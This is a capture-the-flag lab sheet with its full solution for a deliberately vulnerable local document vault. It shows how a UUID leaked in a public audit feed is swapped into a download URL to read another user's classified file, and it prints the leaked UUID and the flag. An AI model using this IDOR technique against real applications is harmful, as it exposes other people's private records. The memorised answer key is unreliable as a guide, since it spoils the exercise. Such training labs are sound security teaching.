# Scenario 18: Obfuscated & UUID Identifier Leakage IDOR

- **Port:** `8018`
- **Category:** Broken Object Level Authorization (IDOR) / UUID Discovery
- **Difficulty:** Intermediate
- **Flag:** `CTF{uu1d_l34k_d0cum3nt_v4ult}`
- **Target URL:** `http://localhost:8018/vault`

---

## Lab Description
This lab contains an Insecure Direct Object Reference (IDOR) vulnerability protected by non-sequential 128-bit cryptographic UUIDs. 

You are logged in as standard employee **Carlos**. The Chief Security Officer uploaded a classified financial audit document (`is_classified = 1`). Because the document uses an unguessable UUID, direct numerical tampering is ineffective.

However, the organization exposes an unauthenticated **Public Activity & Audit Feed** (`GET /api/public/audit-feed` / `/activity`) which leaks the executive officer's document UUID.

To solve this lab, discover the leaked executive document UUID from the activity feed, exploit the IDOR vulnerability on the document viewer endpoint (`GET /api/documents/download?doc_id=<uuid>`), and download the classified file to extract the CTF flag.

---

## Exploitation Walkthrough (Burp Suite & Browser Methodology)

### 1. Reconnaissance & UUID Discovery
1. Navigate to the Public Activity & Audit Feed:
   ```text
   http://localhost:8018/activity
   ```
   *(Or via API: `GET http://localhost:8018/api/public/audit-feed`)*
2. Locate the audit entry created by the **Chief Security Officer**:
   - **Transaction:** *Encrypted and deposited high-clearance executive audit report*
   - **Leaked UUID:** `8f9b2c34-91a0-4d5e-88fc-3176d1e49e22`

### 2. Exploiting the IDOR Endpoint
1. Return to your vault and inspect how your standard document is viewed:
   ```text
   http://localhost:8018/vault/view?doc_id=7b1e4a90-3c21-4f88-9d10-8812a4f61e01
   ```
2. Replace your document UUID with the leaked executive UUID:
   ```text
   http://localhost:8018/vault/view?doc_id=8f9b2c34-91a0-4d5e-88fc-3176d1e49e22
   ```
   *(Or via API: `GET /api/documents/download?doc_id=8f9b2c34-91a0-4d5e-88fc-3176d1e49e22`)*

### 3. Flag Capture
1. The server renders the confidential executive document without verifying object ownership.
2. The lab status updates to **SOLVED 🎉** and the CTF flag is extracted:
   ```text
   CTF{uu1d_l34k_d0cum3nt_v4ult}
   ```
